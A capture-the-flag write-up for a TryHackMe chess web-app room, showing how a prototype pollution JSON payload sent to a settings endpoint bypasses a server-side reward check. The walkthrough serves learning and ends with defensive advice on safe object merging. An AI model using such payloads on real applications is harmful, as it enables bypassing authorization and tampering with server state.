# TryHackMe – Fool's Mate: Revenge

**Difficulty:** Medium  
**Vulnerability:** Prototype Pollution  
**Service:** HTTP (Port 3000)

## 1. Enumeration

The web application was running on port `3000`.

After opening the website, I discovered a chess game with several API endpoints:

- `/api/move` – processes chess moves.
- `/api/reset` – resets the game.
- `/api/settings` – updates game preferences.

## 2. Initial Investigation

After performing the required checkmate (`a1a8`), the server returned:

```json
{
  "ok": true,
  "status": "checkmate",
  "winner": "white",
  "locked": true,
  "message": "Checkmate! No reward for you.",
  "reason": "reward gate closed: session.config.unlocked is not set"
}
```

This revealed that the reward was protected by a server-side condition:

```javascript
session.config.unlocked
```

## 3. Exploitation – Prototype Pollution

I investigated the `/api/settings` endpoint and discovered that it accepted JSON input.

Adding `unlocked: true` directly to the JSON body did not work.

The vulnerability was caused by unsafe object property handling, allowing Prototype Pollution through `constructor.prototype`.

I sent the following JSON payload to `POST /api/settings`:

```json
{
  "constructor": {
    "prototype": {
      "unlocked": true
    }
  },
  "theme": "midnight",
  "pieceSet": "classic",
  "animationMs": 180
}
```

This polluted the JavaScript object prototype, making `unlocked` accessible through the prototype chain.

As a result, the server-side check:

```javascript
session.config.unlocked
```

could evaluate to `true` even without an own `unlocked` property.

## 4. Conclusion

The application was vulnerable to **JavaScript Prototype Pollution** due to unsafe handling of user-controlled JSON properties.

The vulnerability allowed modification of inherited object properties and bypassing the reward condition.

**Key takeaway:** Always validate user-controlled object properties and use safe methods for merging JSON objects. Avoid unsafe recursive merges and protect sensitive prototype-related keys.
